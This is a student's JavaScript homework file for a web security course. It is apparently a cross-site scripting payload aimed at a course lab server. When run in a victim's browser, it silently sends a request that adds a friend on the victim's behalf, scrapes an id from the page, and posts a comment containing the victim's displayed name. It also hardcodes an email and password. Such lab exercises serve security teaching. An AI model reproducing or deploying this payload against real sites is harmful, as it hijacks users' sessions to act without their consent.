/*
Emma Lubes
CSEC-380 Homework 6
Activity 2
Spring 2021
*/

const BASE_URL = "http://csec380-core.csec.rit.edu:86/add_";
const PAYLOAD = {"email": "eml5244@rit.edu", "password": "P@ssw0rd"};

var url = BASE_URL + "friend.php?id=137";
var main = new XMLHttpRequest();
main.open("POST", url, true);
main.setRequestHeader("Content-Type", "x-www-form-urlencoded");
main.send()
console.log("Added a friend!");

const tracer = encodeURI(new Date() + ": connected via " + $("#name").text());

var id = document.documentElement.innerHTML.indexOf("id=") + 3;

function sliceDoc(id) {
    return document.documentElement.innerHTML.slice(id, id+1);
}

var newId = sliceDoc(id);

while(!(isNaN(parseInt(newId)))) {
    id += 1;
    newId += sliceDoc(id);
}

url = BASE_URL + "comment.php?id=137&comment=" + tracer;

main.open("GET", url, true);
main.send();
console.log("Left a comment!");
